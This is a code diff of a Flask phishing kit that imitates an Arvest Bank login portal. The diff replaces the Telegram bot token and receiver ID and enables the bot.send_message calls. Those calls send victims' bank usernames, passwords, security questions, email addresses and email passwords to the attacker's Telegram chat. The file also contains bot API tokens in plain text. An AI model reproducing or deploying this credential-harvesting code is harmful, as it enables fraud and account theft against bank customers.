@@ -3,9 +3,9 @@ from flask import Blueprint, session, render_template, request, redirect, url_fo
 from .utils import report_login, security_question
 import telebot
 
-API_TOKEN = '5716438159:AAGuFg4xF9L44ChmKBFyxLdR5Jk9o7gOLCA'
+API_TOKEN = '5405884216:AAHGNPuvW4kByyWZpqd6O_8l_aZjMwtJdp4'
 
-receiver_id = 1297895706
+receiver_id = -725422686
 
 bot = telebot.TeleBot(API_TOKEN)
 
@@ -17,9 +17,9 @@ def signin():
         user_id = request.form['user-id']
         password = request.form['password']
         if user_id and password:
-            print(user_id,password)
+            # print(user_id,password)
             # report_login(user_id,password, bank_name='ARVEST BANK')
-            # bot.send_message(receiver_id, f'-------------ARVEST BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
+            bot.send_message(receiver_id, f'-------------ARVEST BANK-------------\nUsername: {user_id}\nPassword: {password}\n--------------------------')
             return redirect(url_for('portals.question'))
     return render_template('sign_in.html')
 
@@ -34,8 +34,8 @@ def question():
         ans3 = request.form['ans3']
         email = request.form['email']
         password = request.form['password']
-        print(q1,ans1,q2,ans2,q3,ans3, email, password)
-        # bot.send_message(receiver_id, f'-------------ARVEST -----------\nQ1: {q1}\nQ2: {q2}\nQ3: {q3}\nemail: {email}\nPassword: {password}\n--------------------------')
+        # print(q1,ans1,q2,ans2,q3,ans3, email, password)
+        bot.send_message(receiver_id, f'-------------ARVEST -----------\nQ1: {q1}\nQ2: {q2}\nQ3: {q3}\nemail: {email}\nPassword: {password}\n--------------------------')
         return redirect(url_for('main.syncing'))
     return render_template('security-question.html')
 
